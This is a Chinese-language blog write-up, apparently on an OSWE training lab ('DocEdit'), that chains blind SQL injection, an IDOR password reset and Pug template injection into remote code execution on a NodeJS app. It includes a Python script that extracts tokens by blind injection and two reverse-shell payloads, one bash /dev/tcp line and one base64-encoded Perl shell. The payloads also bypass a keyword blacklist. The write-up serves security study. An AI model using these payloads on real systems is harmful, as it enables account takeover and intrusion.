@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"n0maj1o24.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="访问本lab时，页面如下：  本实验涉及到Like Blind SQL Injection，IDOR，SSTI。 从SQLi到RCE的流程如下：  首先需要注册一个普通用户，然后登录。登录之后新建一个Document，保存之后点击该Document最下方的tag按钮，可以指定Document的归属，在这里的User&#39;s Email填写处存在Like Blind SQL Injection。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSWE Lab DocEdit Writeup">
+<meta property="og:url" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/index.html">
+<meta property="og:site_name" content="Technical Memorandum">
+<meta property="og:description" content="访问本lab时，页面如下：  本实验涉及到Like Blind SQL Injection，IDOR，SSTI。 从SQLi到RCE的流程如下：  首先需要注册一个普通用户，然后登录。登录之后新建一个Document，保存之后点击该Document最下方的tag按钮，可以指定Document的归属，在这里的User&#39;s Email填写处存在Like Blind SQL Injection。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit0.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit1.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit2.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit3.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit4.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit5.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit6.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit7.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit8.png">
+<meta property="article:published_time" content="2021-06-25T12:07:44.000Z">
+<meta property="article:modified_time" content="2021-06-25T04:23:12.185Z">
+<meta property="article:author" content="n0maj1o24">
+<meta property="article:tag" content="OSWE">
+<meta property="article:tag" content="NodeJS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit0.png">
+
+<link rel="canonical" href="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>OSWE Lab DocEdit Writeup | Technical Memorandum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Technical Memorandum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OSWE Lab DocEdit Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-06-25 12:07:44 / 修改时间：04:23:12" itemprop="dateCreated datePublished" datetime="2021-06-25T12:07:44Z">2021-06-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Code-Audit/" itemprop="url" rel="index"><span itemprop="name">Code Audit</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/06/25/OSWE-Lab-DocEdit-Writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/25/OSWE-Lab-DocEdit-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>访问本lab时，页面如下：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit0.png" alt="docedit0"></p>
+<p>本实验涉及到<code>Like Blind SQL Injection</code>，<code>IDOR</code>，<code>SSTI</code>。</p>
+<p>从<code>SQLi</code>到<code>RCE</code>的流程如下：</p>
+<ol>
+<li>首先需要注册一个普通用户，然后登录。登录之后新建一个<code>Document</code>，保存之后点击该<code>Document</code>最下方的<code>tag</code>按钮，可以指定<code>Document</code>的归属，在这里的<code>User&#39;s Email</code>填写处存在<code>Like Blind SQL Injection</code>。</li>
+<li>利用盲注获取管理员的<code>token</code>。</li>
+<li>在普通用户处有个<code>Edit Profile</code>的功能，填写信息然后<code>Update</code>，<code>Burpsuite</code>拦截该数据包，将用户信息更改为管理员的信息，密码改成我们知道的密码即可。<code>token</code>改为第一步获取的管理员<code>token</code>。</li>
+<li>上一步主要是修改管理员密码，利用修改好的管理员账户密码登录管理员。</li>
+<li>在这里的管理员后台有一个<code>Edit Server Settings</code>的功能，这里可以使用<code>PugJs SSTI</code>反弹<code>Shell</code>，完成<code>RCE</code>操作。</li>
+</ol>
+<p>现在，我们来分析源码。可以发现这是一个<code>NodeJs</code>的应用，采用<code>MVC</code>设计模式。还是从<code>Controller</code>开始分析,但是我们需要结合路有来看。首先来搜索一下，是不是有敏感的<code>SQL</code>语句操作。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd docedit</span><br><span class="line">grep -iRn "select" server-src/ --color</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit1.png" alt="docedit1"></p>
+<p>查看源文件：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> searchByEmail = <span class="keyword">async</span> (email) =&gt;  &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> user = <span class="keyword">await</span> models.sequelize.query(<span class="string">"SELECT * FROM `Users` WHERE email LIKE '"</span> + email + <span class="string">"%'"</span>, &#123; <span class="attr">type</span>: QueryTypes.SELECT &#125;);</span><br><span class="line">		<span class="keyword">if</span> (user.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">	  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Something went wrong during the query"</span>)</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>email</code>完全没有过滤，这里存在<code>Like Blind SQL Injection</code>。我们继续看是哪里调用了这里的<code>searchByEmail</code>函数。</p>
+<p><code>server-src/routes/ws.js</code>第190-198行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'checkEmail'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">	userController.searchByEmail(data.email)</span><br><span class="line">	.then(<span class="function">(<span class="params">found</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'emailFound'</span>, found);</span><br><span class="line">	&#125;)</span><br><span class="line">	.catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"error"</span>, <span class="attr">message</span>: error.message&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><code>Burpsuite</code>抓包分析,当访问如下页面时：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit2.png" alt="docedit2"></p>
+<p>对应Burpsuite抓包如下：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit3.png" alt="docedit3"></p>
+<p>这样就找到了漏洞触发点，后续测试发现，不需要新建<code>Document</code>，然后<code>Users</code>下输入邮箱地址，可以直接按照格式请求<code>checkEmail</code>，其中<code>email</code>填写<code>payload</code>即可。</p>
+<p>当邮箱地址匹配数据库中数据时，返回的结果是<code>42[&quot;emailFound&quot;,true]</code>，当匹配不到结果是，返回的结果是<code>42[&quot;emailFound&quot;,false]</code>。这样注入的判断条件也就明确了。</p>
+<p>payload的格式如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b%'or 1=1<span class="comment">#</span></span><br><span class="line">b%'or 1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>盲注的脚本如下：（<code>WebSocket</code>同步，异步的不是很好写，也不是太会写）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blindsql</span><span class="params">(ws, token)</span>:</span></span><br><span class="line">    payload = <span class="string">"b%' or ascii(substr((select token from AuthTokens where id=1),&#123;&#125;,1))=&#123;&#125;#"</span></span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    extracted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ascii_char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):  <span class="comment"># Iterate over the ascii range of characters.</span></span><br><span class="line">            email = payload.format(pos, ascii_char)</span><br><span class="line">            <span class="comment"># print(email)</span></span><br><span class="line">            data = <span class="string">'42["checkEmail",&#123;&#123;"token":"&#123;token&#125;","email":"&#123;email&#125;"&#125;&#125;]'</span>.format(token=token, email=email)</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            ws.send(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'true'</span> <span class="keyword">in</span> ws.recv():</span><br><span class="line">                print(ascii_char)</span><br><span class="line">                <span class="comment"># print(chr(ascii_char))</span></span><br><span class="line">                extracted += chr(ascii_char)</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> extracted</span><br></pre></td></tr></table></figure>
+
+<p>这里跑出来的结果与数据库保存的结果会有一些偏差，如下所示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Database Value:  3d7ed80dee5a1febd7880b77cb218582</span><br><span class="line">Script   Value:  4e8fe91eff6b2gfce8991c88dc329693</span><br></pre></td></tr></table></figure>
+
+<p>每个字符都加了<code>1</code>，这是因为<code>websocket</code>同步处理造成的，修正一下代码即可获取正确的值。</p>
+<p>一般这种注入获取的管理员密码都很复杂，破解不了，所以通过获取管理员密码然后进行登录基本不需要考虑。换一种思路。我们来看一下用户的<code>Edit Profile</code>功能。如下所示：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit4.png" alt="docedit4"></p>
+<p>点击<code>Update</code>之后，<code>Burpsuite</code>所抓数据包如下：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit5.png" alt="docedit5"></p>
+<p>第一反应是可能存在IDOR，因为注入可以获取管理员<code>firstName</code>，<code>lastName</code>，<code>email</code>，<code>token</code>。而<code>password1</code>和<code>password2</code>是我们想要更新的值。查看对应的源码<code>server-src/routes/ws.js</code>第217-225行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'updateProfile'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">	userController.update(socket.locals.user, data.firstName, data.lastName, data.email,data.password1,data.password2)</span><br><span class="line">	.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"success"</span>, <span class="attr">message</span>: <span class="string">"Your user was updated."</span>&#125;);</span><br><span class="line">	&#125;)</span><br><span class="line">	.catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"error"</span>, <span class="attr">message</span>: error.message&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><code>client-src/js/controllers.j</code>第101-106行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">updateProfile(data)&#123;</span><br><span class="line">    data = utils.objectifyForm(data)</span><br><span class="line">    data.token = <span class="keyword">this</span>.socket.locals.user.token</span><br><span class="line">    <span class="keyword">this</span>.socket.emit(<span class="string">'updateProfile'</span>, data)</span><br><span class="line">    <span class="keyword">this</span>.loadingBar.go( <span class="number">30</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对用户权限完全没有限制，也就是说可以用普通用户更改管理员信息。通过这一步更新完管理员密码，我们就可以登录进去了。</p>
+<p>登录管理员之后，查看<code>Edit Server Settings</code>，这里可以渲染<code>Home Page</code>，如下所示：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit6.png" alt="docedit6"></p>
+<p>看一下对应源码：<code>server-src/controllers/pageController.js</code>中第3-28行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> saveHome = <span class="keyword">async</span> (content) =&gt;  &#123;</span><br><span class="line">	<span class="keyword">const</span> blacklist = [<span class="string">"- "</span>,<span class="string">"require"</span>, <span class="string">"child_process"</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(blacklist.some(<span class="function"><span class="params">v</span> =&gt;</span> content.includes(v)))&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Keyword is not allowed"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> page = <span class="keyword">await</span> models.Pages.findOne(</span><br><span class="line">		&#123; <span class="attr">where</span>: &#123; <span class="attr">location</span>: <span class="string">'home'</span> &#125; &#125;</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!page)&#123;</span><br><span class="line">		<span class="keyword">await</span> models.Pages.create(&#123;</span><br><span class="line">			location: <span class="string">'home'</span>,</span><br><span class="line">			content: content,</span><br><span class="line">		  &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> data</span><br><span class="line">		  &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Something went wrong saving your page"</span>);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		page.content = content;</span><br><span class="line">		page.save();</span><br><span class="line">		<span class="keyword">return</span> page</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里存在黑名单，需要绕过。</p>
+<p>再看一下保存的内容是如何渲染的：<code>server-src/routes/ws.js</code>第9到23行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">socket, app, io</span>) </span>&#123;</span><br><span class="line">	socket.on(<span class="string">'getHome'</span>,  <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">await</span> pageController.getHome()</span><br><span class="line">		.then(<span class="function">(<span class="params">page</span>) =&gt;</span> &#123;</span><br><span class="line">		  context = socket.locals;</span><br><span class="line">		  context.title = <span class="string">'Home'</span></span><br><span class="line">		  html = pug.render(page,context)</span><br><span class="line">		  socket.emit(<span class="string">'homePage'</span>, html);</span><br><span class="line">		&#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">		  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"error"</span>, <span class="attr">message</span>: err.message&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>利用了<code>pug</code>进行渲染，这里可能存在<code>pug SSTI</code>。</p>
+<p>可以使用如下<code>payload</code>来进行反弹<code>shell</code></p>
+<p>第一种<code>payload</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&#123;[][<span class="string">"constructor"</span>][<span class="string">"constructor"</span>](<span class="string">"process.binding('spawn_sync').spawn(&#123;file:'bash',args:['/bin/bash','-c','bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'],envPairs:['y='],stdio:[&#123;type:'pipe',readable:1&#125;]&#125;)"</span>)()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit7.png" alt="docedit7"></p>
+<p>第二种<code>payload</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&#123;spawn_sync = this.process.binding(<span class="string">'spawn_sync'</span>)&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123; normalizeSpawnArguments = <span class="keyword">function</span>(c,b,a)&#123;<span class="keyword">if</span>(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a=&#123;&#125;),a=Object.assign(&#123;&#125;,a),a.shell)&#123;const g=[c].concat(b).join(<span class="string">' '</span>);typeof a.shell===<span class="string">'string'</span>?c=a.shell:c=<span class="string">'/bin/sh'</span>,b=[<span class="string">'-c'</span>,g];&#125;typeof a.argv0===<span class="string">'string'</span>?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];<span class="keyword">for</span>(var f <span class="keyword">in</span> d)e.push(f+<span class="string">'='</span>+d[f]);<span class="built_in">return</span>&#123;file:c,args:b,options:a,envPairs:e&#125;;&#125;&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123;spawnSync = <span class="function"><span class="title">function</span></span>()&#123;var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;<span class="keyword">if</span>(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[&#123;<span class="built_in">type</span>:<span class="string">'pipe'</span>,readable:!0,writable:!1&#125;,&#123;<span class="built_in">type</span>:<span class="string">'pipe'</span>,readable:!1,writable:!0&#125;,&#123;<span class="built_in">type</span>:<span class="string">'pipe'</span>,readable:!1,writable:!0&#125;],a.input)&#123;var g=a.stdio[0]=util._extend(&#123;&#125;,a.stdio[0]);g.input=a.input;&#125;<span class="keyword">for</span>(c=0;c&lt;a.stdio.length;c++)&#123;var e=a.stdio[c]&amp;&amp;a.stdio[c].input;<span class="keyword">if</span>(e!=null)&#123;var f=a.stdio[c]=util._extend(&#123;&#125;,a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);&#125;&#125;console.log(a);var b=spawn_sync.spawn(a);<span class="keyword">if</span>(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==<span class="string">'buffer'</span>)<span class="keyword">for</span>(c=0;c&lt;b.output.length;c++)&#123;<span class="keyword">if</span>(!b.output[c])<span class="built_in">continue</span>;b.output[c]=b.output[c].toString(a.encoding);&#125;<span class="built_in">return</span> b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + <span class="string">'spawnSync '</span>+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;&#125;&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123;payload=<span class="string">'dXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMy40IjskcD00NDQ0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Owo='</span>&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#123;resp=spawnSync(<span class="string">'perl'</span>,[<span class="string">'-e'</span>,(new Buffer(payload, <span class="string">'base64'</span>)).toString(<span class="string">'ascii'</span>)])&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
